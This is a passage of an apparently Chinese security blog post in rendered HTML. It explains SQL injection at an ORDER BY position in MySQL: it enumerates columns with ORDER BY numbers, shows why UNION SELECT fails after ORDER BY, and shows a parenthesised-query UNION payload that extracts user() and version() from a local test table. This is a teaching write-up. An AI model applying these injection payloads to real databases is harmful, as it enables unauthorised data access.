+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">test1</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="mi">123456</span><span class="w">   </span><span class="o">|</span><span class="w">   </span><span class="mi">18</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">beijing</span><span class="w">   </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">2</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">test2</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="mi">543210</span><span class="w">   </span><span class="o">|</span><span class="w">   </span><span class="mi">20</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">shanghai</span><span class="w">  </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">3</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">user1</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">qwer1234</span><span class="w"> </span><span class="o">|</span><span class="w">   </span><span class="mi">28</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">guangzhou</span><span class="w"> </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">4</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">aduser</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mi">123456</span><span class="w">   </span><span class="o">|</span><span class="w">   </span><span class="mi">10</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">beijing</span><span class="w">   </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+--------+----------+------+-----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">4</span><span class="w"> </span><span class="k">rows</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">01</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="2获取字段数" class="heading-element"><span>2、获取字段数</span>
+  <a href="#2%e8%8e%b7%e5%8f%96%e5%ad%97%e6%ae%b5%e6%95%b0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>Order by 后面加数字就能进行字段数的枚举，当数字大于字段数时，就会产生类似如下报错：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="mi">5</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+-------+----------+------+-----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">name</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">pass</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="n">age</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">area</span><span class="w">      </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+-------+----------+------+-----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">test1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mi">123456</span><span class="w">   </span><span class="o">|</span><span class="w">   </span><span class="mi">18</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">beijing</span><span class="w">   </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">3</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">user1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">qwer1234</span><span class="w"> </span><span class="o">|</span><span class="w">   </span><span class="mi">28</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">guangzhou</span><span class="w"> </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">2</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">test2</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mi">543210</span><span class="w">   </span><span class="o">|</span><span class="w">   </span><span class="mi">20</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">shanghai</span><span class="w">  </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+-------+----------+------+-----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">3</span><span class="w"> </span><span class="k">rows</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="mi">6</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ERROR</span><span class="w"> </span><span class="mi">1054</span><span class="w"> </span><span class="p">(</span><span class="mi">42</span><span class="n">S22</span><span class="p">):</span><span class="w"> </span><span class="k">Unknown</span><span class="w"> </span><span class="k">column</span><span class="w"> </span><span class="s1">&#39;6&#39;</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="s1">&#39;order clause&#39;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165050006.png" alt="图片" srcset="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165050006.png?size=small, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165050006.png?size=medium 1.5x, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165050006.png?size=large 2x" data-title="图片" style="--width: 1080px;--aspect-ratio: 1080 / 304;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h3 id="3联合注入罕见" class="heading-element"><span>3、联合注入(罕见)</span>
+  <a href="#3%e8%81%94%e5%90%88%e6%b3%a8%e5%85%a5%e7%bd%95%e8%a7%81" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>order by位置后无法接union select，语法不支持，报错如下。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ERROR</span><span class="w"> </span><span class="mi">1064</span><span class="w"> </span><span class="p">(</span><span class="mi">42000</span><span class="p">):</span><span class="w"> </span><span class="n">You</span><span class="w"> </span><span class="n">have</span><span class="w"> </span><span class="n">an</span><span class="w"> </span><span class="n">error</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="n">your</span><span class="w"> </span><span class="k">SQL</span><span class="w"> </span><span class="n">syntax</span><span class="p">;</span><span class="w"> </span><span class="k">check</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">manual</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">corresponds</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">your</span><span class="w"> </span><span class="n">MySQL</span><span class="w"> </span><span class="n">server</span><span class="w"> </span><span class="k">version</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="k">right</span><span class="w"> </span><span class="n">syntax</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">use</span><span class="w"> </span><span class="n">near</span><span class="w"> </span><span class="s1">&#39;union select 1,2,3,4,5&#39;</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="n">line</span><span class="w"> </span><span class="mi">1</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>但是有一种情况，可能可以用，即前一句SQL语句整体处在括号中。如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">id</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+--------+----------+------+-----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">name</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">pass</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="n">age</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">area</span><span class="w">      </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+--------+----------+------+-----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">test1</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="mi">123456</span><span class="w">   </span><span class="o">|</span><span class="w">   </span><span class="mi">18</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">beijing</span><span class="w">   </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">2</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">test2</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="mi">543210</span><span class="w">   </span><span class="o">|</span><span class="w">   </span><span class="mi">20</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">shanghai</span><span class="w">  </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">3</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">user1</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">qwer1234</span><span class="w"> </span><span class="o">|</span><span class="w">   </span><span class="mi">28</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">guangzhou</span><span class="w"> </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">4</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">aduser</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mi">123456</span><span class="w">   </span><span class="o">|</span><span class="w">   </span><span class="mi">10</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">beijing</span><span class="w">   </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+--------+----------+------+-----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">4</span><span class="w"> </span><span class="k">rows</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">01</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">id</span><span class="p">)</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+--------+----------+------+-----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">name</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">pass</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="n">age</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">area</span><span class="w">      </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+--------+----------+------+-----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">test1</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="mi">123456</span><span class="w">   </span><span class="o">|</span><span class="w">   </span><span class="mi">18</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">beijing</span><span class="w">   </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">2</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">test2</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="mi">543210</span><span class="w">   </span><span class="o">|</span><span class="w">   </span><span class="mi">20</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">shanghai</span><span class="w">  </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">3</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">user1</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">qwer1234</span><span class="w"> </span><span class="o">|</span><span class="w">   </span><span class="mi">28</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">guangzhou</span><span class="w"> </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">4</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">aduser</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mi">123456</span><span class="w">   </span><span class="o">|</span><span class="w">   </span><span class="mi">10</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">beijing</span><span class="w">   </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mi">2</span><span class="w">      </span><span class="o">|</span><span class="w"> </span><span class="mi">3</span><span class="w">        </span><span class="o">|</span><span class="w">    </span><span class="mi">4</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mi">5</span><span class="w">         </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+--------+----------+------+-----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">5</span><span class="w"> </span><span class="k">rows</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">01</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这种情况非常罕见，利用条件比较苛刻。</p>
+<p><img loading="lazy" src="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165136764.png" alt="图片" srcset="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165136764.png?size=small, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165136764.png?size=medium 1.5x, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOrderBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814165136764.png?size=large 2x" data-title="图片" style="--width: 1080px;--aspect-ratio: 1080 / 569;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">id</span><span class="p">)</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="k">user</span><span class="p">(),</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="k">version</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+----------------+----------+------+-----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">name</span><span class="w">           </span><span class="o">|</span><span class="w"> </span><span class="n">pass</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="n">age</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">area</span><span class="w">      </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+----------------+----------+------+-----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">test1</span><span class="w">          </span><span class="o">|</span><span class="w"> </span><span class="mi">123456</span><span class="w">   </span><span class="o">|</span><span class="w">   </span><span class="mi">18</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">beijing</span><span class="w">   </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">2</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">test2</span><span class="w">          </span><span class="o">|</span><span class="w"> </span><span class="mi">543210</span><span class="w">   </span><span class="o">|</span><span class="w">   </span><span class="mi">20</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">shanghai</span><span class="w">  </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">3</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">user1</span><span class="w">          </span><span class="o">|</span><span class="w"> </span><span class="n">qwer1234</span><span class="w"> </span><span class="o">|</span><span class="w">   </span><span class="mi">28</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">guangzhou</span><span class="w"> </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">4</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">aduser</span><span class="w">         </span><span class="o">|</span><span class="w"> </span><span class="mi">123456</span><span class="w">   </span><span class="o">|</span><span class="w">   </span><span class="mi">10</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">beijing</span><span class="w">   </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">root</span><span class="o">@</span><span class="mi">127</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mi">3</span><span class="w">        </span><span class="o">|</span><span class="w">    </span><span class="mi">4</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mi">8</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">31</span><span class="w">    </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+----------------+----------+------+-----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">5</span><span class="w"> </span><span class="k">rows</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">01</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span></span></span></code></pre></td></tr></table>
+</div>
